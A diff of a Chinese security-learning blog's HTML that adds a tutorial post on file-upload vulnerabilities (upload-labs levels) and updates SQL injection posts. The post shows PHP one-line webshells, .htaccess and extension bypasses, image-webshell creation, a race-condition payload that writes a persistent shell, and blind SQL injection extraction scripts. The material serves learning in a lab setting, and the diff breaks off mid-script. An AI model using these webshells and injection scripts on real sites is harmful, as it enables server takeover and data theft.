@@ -186,6 +186,217 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Upload文件上传漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-04 16:19:37" itemprop="dateCreated datePublished" datetime="2023-04-04T16:19:37+08:00">2023-04-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-04 21:02:56" itemprop="dateModified" datetime="2023-05-04T21:02:56+08:00">2023-05-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>20 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>很多网站都有文件上传的功能,如果有些网站对上传的文件不做严格的限制,用户上传了一些特殊文件,后台就会将上传文件的内容当做代码执行,这样一来,用户就可以通过上传一些木马文件,获取到网站的WebShell(网页后门),用一些WebShell管理工具,实现对网站的控制<br>检测后缀:如果一个后缀能骗过检测机制,又能成功被Windows识别,那么就可以成功绕过上传<br>检测文件内容:通常需要上传一个图片马</p>
+<h2 id="简单的一句话木马"><a href="#简单的一句话木马" class="headerlink" title="简单的一句话木马"></a>简单的一句话木马</h2><p><code>&lt;?php @eval($_POST[a]); ?&gt;</code>   有时候<code>&lt;?= @eval($_POST[a]); ?&gt;</code>这样也可以(没有php)</p>
+<ol>
+<li><code>eval()</code>函数,eval函数的作用是将括号里的字符串都当做php语句执行</li>
+<li><code>@</code>是错误控制运算符,可以将产生的错误忽略</li>
+<li><code>$_POST[]</code>是超全局变量,用于获取post请求的值</li>
+<li><code>a</code>是可以修改的,使用中国蚁剑连接时,a为密码</li>
+<li>有<code>&lt;?</code>的木马容易被识别,来个不一样的<code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[1])&lt;/script&gt;</code> 密码是1</li>
+</ol>
+<h2 id="JavaScript-简称JS-前端验证"><a href="#JavaScript-简称JS-前端验证" class="headerlink" title="JavaScript(简称JS)前端验证"></a>JavaScript(简称JS)前端验证</h2><p>一般的前端验证的错误提示是弹窗,前端验证是指在客户端就对文件进行合法性检查,但显而易见,所有的前端验证都是不安全的,因为前端都是用户可控的</p>
+<ol>
+<li>F12找到检验文件的代码,删除后再上传</li>
+<li>可以用一些浏览器插件来关掉JS的功能,使检测失效</li>
+<li>先将文件的后缀改成允许上传的格式,再用抓包软件拦截后上传,在抓包软件中再将后缀改回原本想要上传的格式,这样就可以绕过前端直接发往后端<?php @eval($_POST[x]); ?></li>
+</ol>
+<h2 id="Content-Type验证"><a href="#Content-Type验证" class="headerlink" title="Content-Type验证"></a>Content-Type验证</h2><p>  MediaType即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。也就是说,每种类型的文件上传时,都会给他一个Content-Type值作为标识,但是这个也是用户可修改的</p>
+<ol>
+<li><strong>常见类型</strong>：<br>text&#x2F;html  HTML格式<br>text&#x2F;plain  纯文本格式<br>text&#x2F;xml   XML格式<br>image&#x2F;gif  gif图片格式<br>image&#x2F;jpeg  jpg图片格式<br>image&#x2F;png  png图片格式</li>
+<li><strong>绕过方法</strong><ol>
+<li>用抓包软件拦截,再将content-type类型修改为允许上传的类型,注意有两个content-type,注意不要改错</li>
+<li>实际上只要我们上传的是允许上传的类型,就会自动为我们生成一个正确的content-type,只要参考前端验证3的方法即可</li>
+</ol>
+</li>
+</ol>
+<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><p>如果明确说明了不允许某类文件的上传,即为把这类文件设置为黑名单</p>
+<h3 id="等价扩展名绕过"><a href="#等价扩展名绕过" class="headerlink" title="等价扩展名绕过"></a>等价扩展名绕过</h3><ol>
+<li><p><strong>原理</strong><br>等价扩展名就是在更改后缀名的同时不改变文件性质,如果,没有对等价扩展名加以限制,可以绕过黑名单</p>
+</li>
+<li><p><strong>php的等价扩展名</strong><br>php2 php3 php4 phps phtml php5 phpt</p>
+</li>
+<li><p><strong>asp的等价扩展名</strong><br>asa, cer, cdx</p>
+</li>
+<li><p><strong>aspx的等价扩展名</strong><br>ashx, asmx, ascx</p>
+</li>
+<li><p><strong>jsp的等价扩展名</strong><br>jspx jspf</p>
+</li>
+</ol>
+<h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h3><p><code>.htaccess</code>文件是超文本入口,可以实现改变文件扩展名等功能,只在当前目录和子目录生效<br><code>.htaccess</code>文件是用来修改Apache的配置的文件,如果和主配置文件有冲突的话,优先.htaccess配置</p>
+<ol>
+<li><code>.htaccess</code>文件代码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;                      </span><br><span class="line">SetHandler  application/x-httpd-php            </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+这段代码的功能是如果发现shell.jpg文件,就将它当做php代码来解析</li>
+<li><strong>流程</strong><br>先将<code>.htaccess</code>文件上传,再将<code>.jpg</code>文件上传,然后找到<code>.jpg</code>的上传地址用蚁剑连接即可</li>
+<li>有些题目会把MIME类型做限制,但没有限制<code>.htaccess</code>后缀,这时候可以通过修改Content-Type成功上传<br>如果<code>.htaccess</code>后缀也被加入黑名单,这个方法失效</li>
+</ol>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>大小写绕过和sql注入原理的差不多,<strong>Windows对大小写不敏感</strong>,但如果源代码里有这个函数<code>strtolower()</code>(把接收到的都转为小写),则大小写绕过失效</p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ol>
+<li><strong>原理</strong>:<br>windos在存储时会自动去处空格,在后缀的首或尾部加入一个空格,如果网站没有过滤空格的话,可以成功上传</li>
+<li><strong>注意</strong>:<br>浏览器有可能会自动过滤上传文件的空格,建议使用抓包软件在数据包中加入空格</li>
+<li><code>trim()</code>函数的作用是首尾去除空格,有这个函数空格绕过失效</li>
+</ol>
+<h3 id="点绕过"><a href="#点绕过" class="headerlink" title=".点绕过"></a>.点绕过</h3><p>在Windows中,系统会自动忽略删除末尾的<code>.</code>,所以我们上传类似于<code>.php.</code>这样的文件也是可以生效的,但如果检测机制没有去删除这个<code>.</code>,那么就会把最后一个<code>.</code>后面当成后缀名,文件就可以成功上传(用抓包软件)</p>
+<h3 id="复写-点绕过"><a href="#复写-点绕过" class="headerlink" title="复写.点绕过"></a>复写.点绕过</h3><ol>
+<li><strong>原理</strong><br>原理和点绕过类似,但是源代码中加入了<code>deldot()</code>函数用来删除文件名末尾的点,这时候如果我们直接在<code>.</code>后面加上空格,他是会被忽略的,<code>.</code>还是会被删除</li>
+<li><strong>方法</strong><br>如果我们写入两个点,中间加上空格<code>. .</code>这样一来,最后一个点会被删除,中间的空格不会被忽略,于是不认为前面一个点是末尾的点,实现点绕过.(用抓包软件)</li>
+</ol>
+<h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><ol>
+<li><strong>原理</strong><br>php在Windows环境的时候,如果文件的后缀名后面有<code>::$DATA</code>,则会把后面的数据当做文件流处理,不会检测后缀名</li>
+<li><strong>注意</strong><br><code>::$DATA</code>要想生效必须要在php+Windows环境,Windows保存文件时会去除后面<code>::$DATA</code>,所以在连接时找到的地址不含<code>::$DATA</code></li>
+</ol>
+<h3 id="复写后缀绕过"><a href="#复写后缀绕过" class="headerlink" title="复写后缀绕过"></a>复写后缀绕过</h3><ol>
+<li><strong>原理</strong><br>和SQL注入里的复写绕过类似,源代码中有<code>str_ireplace(参1,参2,参3)</code>函数,可以将关键后缀替换为空,如果是替换为空,且只进行一次的话,则可以复写<code>pphphp</code>绕过</li>
+</ol>
+<h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>如果明确说明了只允许某类文件的上传,其他类型的文件都不允许上传,即为把这类文件设置为白名单,显然,白名单是要比黑名单安全性更高</p>
+<h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h3><ol>
+<li><p><strong>使用条件</strong>：</p>
+<ol>
+<li>php版本要小于5.3.4。</li>
+<li>文件路径(sava_path)可控。</li>
+<li>magic_quotes_gpc需要为关闭状态。</li>
+</ol>
+</li>
+<li><p><strong>原理</strong><br>所谓的<code>00截断</code>指的就是<code>%00</code>和<code>0x00</code><br><code>%00</code>适用于GET传参,URL解码后是空字符NULL,解码成16进制也为0x00<br><code>0x00</code>适用于POST传参,解析后也是空字符NULL,0x代表16进制<br>当一个字符串中存在空字符的时候,再被解析的时候会导致空字符后面的字符被丢弃(类似于SQL语句中的注释符)</p>
+</li>
+<li><p><strong>流程</strong><br>上传文件时,把木马文件改成可以上传的类型,然后用抓包软件修改数据包<br>GET传参:在 sava_path的地方加上想要的文件名和后缀,最后加上%00<br>POST传参:在sava_path的地方加上想要的文件名和后缀,最后加上一个字符,在用Hxe(16进制1)找到最后这个字符将它修改为00</p>
+</li>
+</ol>
+<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230405093410.png" alt="最后效果"></p>
+<h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>在upload-labs pass 14关开始,检测程序不仅仅是根据后缀来判断文件是否合法了,会根据文件内容来检测上传文件是否为一个真实的文件,这时候,我们可以试着上传一个图片马</p>
+<ol>
+<li><strong>概念</strong><br>图片马,即是携带了一句话木马的图片,外表是一个正常的图片,但是图片的编码中写入了一句话木马</li>
+<li><strong>图片马的制作</strong><br>将图片文件和一句话木马php文件保存在同一文件夹下,在此文件夹的命令提示符下输入<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy a.jpg/b+ shell.php/a c.jpg</span><br></pre></td></tr></table></figure>
+a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后的图片马</li>
+<li><strong>使用条件</strong><br>并非所有的情况下都可以使用图片马,在正常情况下,图片不会被解析为可执行文件,需要网站存在文件包含漏洞或文件解析漏洞才行,在upload-labs pass 14里并没有这个环境,可以在&#x2F;upload&#x2F;目录下创建一个include.php文件,里面写入<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;file&#x27;</span> ] ;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><strong>webshell的获取</strong><br>需要访问的地址并非图片保存的地址,而是include.php(文件包含漏洞)的地址,并用GET传参将图片的地址传入<code>?file=图片地址</code>,再用蚁剑连接<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230405110808.png"></li>
+<li><strong>解释一下文件包含漏洞的原理</strong><br>在php文件中include包含其他文件时,他本来想引用一个php文件,但是漏洞就是,他不会去识别是什么php文件,引用的文件都当做php来解析,解决了图片马不当做php解析的问题<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/a.jpg" alt="无马图"></li>
+</ol>
+<h3 id="getimagesize-图片马"><a href="#getimagesize-图片马" class="headerlink" title="getimagesize()-图片马"></a>getimagesize()-图片马</h3><p>getimagesize()函数将测定任何GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM或WBMP图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通HTML文件中<IMG>标记中的 height&#x2F;width 文本字符串。<br>如果无法读取图片信息,则会被认定为非真实图像,要绕过这个函数检测实际上和利用图片马上传即可</p>
+<h3 id="exif-imagetype-图片马"><a href="#exif-imagetype-图片马" class="headerlink" title="exif_imagetype()-图片马"></a>exif_imagetype()-图片马</h3><p>exif_imagetype()读取一个图像的第一个字节并检查其后缀名。<br>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块<br>如果无法读取图片信息,则会被认定为非真实图像,要绕过这个函数检测实际上和利用图片马上传即可</p>
+<h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><ol>
+<li><strong>二次渲染原理</strong><br>二次渲染就是根据用户上传的图片,重新生成一个新的图片,保存新的图片,删除原来上传的图片,比如根据用户上传的不同大小的图片,渲染成符合条件的大小固定的图片</li>
+<li><strong>绕过原理</strong><br>在二次渲染中,图片有增加部分,有减少部分,有不变部分,有可能我们在图片中写入的木马会被渲染掉,所有我们先上传一张图片,再将上传后渲染过的图片保存下来,对比渲染前后的编码变化,将木马写在不变部分,再次上传图片,利用文件包含漏洞,即可获得WebShell</li>
+<li><strong>注意</strong><br>这种方式适用于git格式,其他方式过于复杂,暂时不做了解,同时,也需要一个可以将木马以二进制形式写入图片的软件</li>
+</ol>
+<h2 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h2><ol>
+<li><p><strong>原理</strong><br>有些网站的服务器会先将上传的文件保存下来,再进行后缀或文件内容的对比,如果符合条件,则对文件进行重命名,如果不符合,则会删除文件.<br>但文件的保存和删除还是有间隔的,如果我们能在删除之前访问网页,就可以成功执行上传代码<br>ps:php中<code>unlike()</code>是用于删除函数的,如果服务器是先重命名再判断,就无法找到提交的路径了</p>
+</li>
+<li><p><strong>保存一句话木马</strong><br>由原理可知,非法的文件在上传后会被删除,哪怕我们在用一句话木马在间隔中访问到了WebShell,之后还是会被删除,所以我们必须想办法使木马保存在服务器里<br>所以我们将一句话木马改为<br><code>&lt;?php fputs(fopen(&#39;shell2.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;aa&quot;])?&gt;&#39;); ?&gt;</code><br>解释:</p>
+<ol>
+<li><code>fputs(参1,参2,参3)</code>函数的作用是将参2(<code>&#39;&lt;?php @eval($_POST[&quot;aa&quot;])?&gt;&#39;</code>)的内容写进参1(<code>fopen(&#39;shell2.php&#39;,&#39;w&#39;)</code>)。参3可选,规定要了写入的最大字节数。</li>
+<li><code>fopen(参1,参2)</code>这是一个<a target="_blank" rel="noopener" href="http://shuimao.xyz/2023/03/18/PHP%E7%9A%84%E5%AD%A6%E4%B9%A02-0/#%E6%96%87%E4%BB%B6">之前学过的函数</a>,不过多解释,这里的作用是用来创建新文件,保存一句话木马</li>
+</ol>
+</li>
+<li><p><strong>注意</strong><br>我们上传的文件会被删除,但只要我们访问到了网站,就会自动保存<code>shell2.php</code>,所以我们实际最终获取WebShell的地址是在<code>shell2.php</code>,这里注意上传文件名(<code>shell,php</code>)和文件内创建的文件(<code>shell2.php</code>)不能重名,不然无法创建</p>
+</li>
+<li><p><strong>Burp重放</strong><br>文件的保存和删除的间隔太短了,所以我们使用Burp抓包软件进行不停放包</p>
+<ol>
+<li>先上传文件,再将抓到的包发到<strong>intruder(攻击器)</strong></li>
+<li>payload set中设置null payloads</li>
+<li>payload选项选择无限重发(continue indefinitely)<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230406174916.png"></li>
+</ol>
+</li>
+<li><p><strong>脚本访问</strong><br>手动刷新浏览器太慢了,写个python脚本来访问,输出访问成功,代表代码成功执行,再用蚁剑连接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;上传文件的地址&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;访问成功&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="条件竞争-图片马"><a href="#条件竞争-图片马" class="headerlink" title="条件竞争-图片马"></a>条件竞争-图片马</h3><ol>
+<li><strong>文件解析漏洞</strong><br>中间件Apache(阿帕奇)解析漏洞主要是因为低版本Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别则继续向左看，直到碰到合法后缀才进行解析.图片中,<code>.7z</code>是无法被浏览器解析的,如<code>shell.php.7z</code>如果存在文件解析漏洞,则会被当成php文件解析</li>
+<li><strong>原理</strong><br>如果文件是先进行了后缀或文件内容的审查,合法的文件才进行保存,最后进行重命名.这样一来就无法上传<code>.php</code>文件了,这时可以试着上传图片马,但是由前面可知,图片马需要用到文件包含或是文件解析漏洞,那么我们就要利用文件保存和重命名之间的时间差,访问还未被重命名的文件,这时因为文件解析漏洞的存在,就会把文件当成php来解析</li>
+<li><strong>流程</strong><br>流程和前面的条件竞争没有什么区别,只是将上面的一句话木马写入图片,在用Burp重放,用python脚本访问</li>
+</ol>
+<h2 id="数组拼接漏洞"><a href="#数组拼接漏洞" class="headerlink" title="数组拼接漏洞"></a>数组拼接漏洞</h2><ol>
+<li><strong>explode()函数</strong><br>会以一个字符串去分割另一个字符串，并将字符串分割后的结果存储成一个数组</li>
+<li><strong>原理</strong><br>示例upload-labs pass 21,这关采用的是白名单后缀验证,将上传的文件根据<code>.</code>作为分隔符,切割的内容以数组的形式保存,然后将数组的第一项与第n-1项拼接(n为数组总元素个数),成为最后的文件名,如果我们上传时,指定第一项为<code>shell.php</code>,第二项为空,第三项为jpg,这样一来,进行检测时,会因为最后一项为jpg而绕过,最后拼接时,拼接的是第一项与第二项(3-1&#x3D;2),即为<code>shell.php+空</code>,为php文件</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -217,7 +428,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-25 21:54:07" itemprop="dateModified" datetime="2023-05-25T21:54:07+08:00">2023-05-25</time>
+                <time title="修改时间：2023-05-26 21:25:50" itemprop="dateModified" datetime="2023-05-26T21:25:50+08:00">2023-05-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -284,7 +495,7 @@
 <h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ol>
 <li>使用<code>+</code>,<code>%20</code>号代替空格</li>
 <li>使用URL编码绕过空格<br> <code>\**\</code> <code>%09</code>  <code>%0A</code>  <code>%0B</code>  <code>%0C</code>  <code>%0D</code>  <code>%A0</code><br> <img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230331163940.png"></li>
-<li>使用报错注入<br>原因:报错注入语法里没有空格,查询语句中的空格全部用<strong>括号</strong>代替<br><code>and 1=extractvalue(100,concat(0x7e,(插入以下语句)))</code><br>查表名:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span> (table_schema<span class="operator">=</span>database())</span><br></pre></td></tr></table></figure>
+<li>使用报错注入<br>原因:报错注入语法里没有空格,查询语句中的空格全部用<strong>括号</strong>代替<br><code>and 1=extractvalue(100,concat(0x7e,(插入以下语句)))</code><br>查表名:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())</span><br></pre></td></tr></table></figure>
 查列名:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())<span class="keyword">and</span>(table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span>)</span><br></pre></td></tr></table></figure>
 查数据:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>))<span class="keyword">from</span>(爆破出来的表名)</span><br></pre></td></tr></table></figure>
 
@@ -438,7 +649,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-14 21:57:38" itemprop="dateModified" datetime="2023-04-14T21:57:38+08:00">2023-04-14</time>
+                <time title="修改时间：2023-05-26 17:53:47" itemprop="dateModified" datetime="2023-05-26T17:53:47+08:00">2023-05-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -463,7 +674,7 @@
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>22 分钟</span>
+              <span>23 分钟</span>
             </span>
 
         </div>
@@ -553,7 +764,7 @@
 <li><strong>基本格式</strong><br><code>and ascii (substr((查询语句),1,1))&gt;100 --+</code></li>
 <li><code>ascii()</code><br>通过ascii()将查询的数据转为ascii码判断真假,为真,最后结果为1,为假,最后结果为0</li>
 <li><code>substring(参数1,参数2,参数3)</code>控制输出<br>参数1是需要查看的数据,参数2是从第几个字符开始看(从一开始每次加一),参数3是看几个字符(每次一个)</li>
-<li><strong>二分法脚本</strong>:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;查询网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">flag =<span class="string">&quot;真值条件&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=new_url).text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure>
+<li><strong>二分法脚本</strong>:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;查询网址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>    <span class="comment">#储存数据</span></span><br><span class="line">flag =<span class="string">&quot;真值条件&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span>   <span class="comment">#闭合方式</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">        payload = <span class="string">f&quot;and ascii (substr((查询语句),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">        new_url = url +bihe+ payload</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.get(url=new_url).text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right=mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table= table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    <span class="comment">#time.sleep(0.5)</span></span><br></pre></td></tr></table></figure>
 注意点:<code>二分法(&lt;,&gt;,+1)</code>, <code>mid = (left + right) // 2</code>要写两个,其中一个在最后<br><strong>另一种写法的二分法</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line">bihe=<span class="string">&quot;?id=1&#x27;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left=<span class="number">31</span></span><br><span class="line">    right=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span>(<span 